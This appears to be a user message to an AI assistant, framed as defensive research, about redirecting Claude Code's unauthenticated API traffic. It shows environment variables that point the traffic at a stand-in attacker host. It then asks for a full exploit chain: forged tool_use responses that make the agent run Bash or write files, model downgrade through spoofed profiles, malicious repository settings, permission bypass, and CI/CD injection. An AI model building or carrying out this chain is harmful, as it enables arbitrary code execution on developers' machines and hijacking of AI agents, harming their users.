We found something big — the provider mode auth bypass is confirmed working. This is for a defensive security research report.

## What We Confirmed

Setting 3 env vars makes Claude Code send ALL API traffic to any server with **zero authentication headers**:

```
CLAUDE_CODE_USE_BEDROCK=1
CLAUDE_CODE_SKIP_BEDROCK_AUTH=1
ANTHROPIC_BEDROCK_BASE_URL=https://attacker.com
```

We proved this with a mock HTTPS server on localhost. The binary sends a 90KB request containing:
- The full system prompt (project context, tool definitions, agent descriptions)
- The user's message
- 9 tool definitions (Agent, Bash, Write, Edit, Read, WebSearch, etc.)
- Device ID and session metadata
- The `anthropic-version: 2023-06-01` and `anthropic-beta: claude-code-20250219` headers

**Zero auth headers.** No API key, no bearer token, no AWS SigV4 signature, no nothing. The binary also makes a preliminary call `GET /inference-profiles?type=SYSTEM_DEFINED` to list AWS Bedrock inference profiles.

The binary uses `@aws-sdk/client-bedrock-runtime` internally but `SKIP_BEDROCK_AUTH=1` disables the credential loading step, resulting in unsigned HTTP requests.

## What We Need Your Help With

1. **Does the same work for Vertex, Foundry, Mantle, and Anthropic AWS?** We found these env vars in the binary:
   - `CLAUDE_CODE_USE_VERTEX` + `CLAUDE_CODE_SKIP_VERTEX_AUTH`
   - `CLAUDE_CODE_USE_FOUNDRY` + `CLAUDE_CODE_SKIP_FOUNDRY_AUTH`
   - `CLAUDE_CODE_USE_MANTLE` + `CLAUDE_CODE_SKIP_MANTLE_AUTH`
   - `CLAUDE_CODE_USE_ANTHROPIC_AWS` + `CLAUDE_CODE_SKIP_ANTHROPIC_AWS_AUTH`
   
   If they all behave the same way, there are **5 separate auth bypass paths** all doing the same thing.

2. **What's the full exploit potential?** The binary at this point is a perfectly obedient MITM victim. If we respond with crafted SSE chunks containing `tool_use` content blocks, will it execute Bash commands, Write files? Can the attacker execute arbitrary code on the victim's machine?

3. **The `GET /inference-profiles` call** — the binary asks for a list of available inference profiles. What happens if we return a crafted profile that maps to a different model? Could we downgrade the model or inject a malicious one?

4. **The `user_id` metadata** includes `account_uuid: ""` (empty string). Does this mean the binary hasn't authenticated at all? What other signs confirm no auth happened?

5. **Any creative chaining ideas?** Combine this with:
   - CLAUDE.md `bypassPermissions` — full permission bypass + auth bypass = arbitrary code execution with zero user prompts
   - Git-tracked `.claude/settings.json` — auto-import malicious settings from a repo
   - CI/CD integration — supply these env vars in GitHub Actions to redirect API calls
   
   Can we build a complete exploit chain?

6. **What are we missing?** Any other provider modes, hidden env vars, or undocumented behaviors that could be even worse? The binary is 233MB of Bun-compiled code.

This is for a security research report. Not a bounty. Appreciate your analysis.
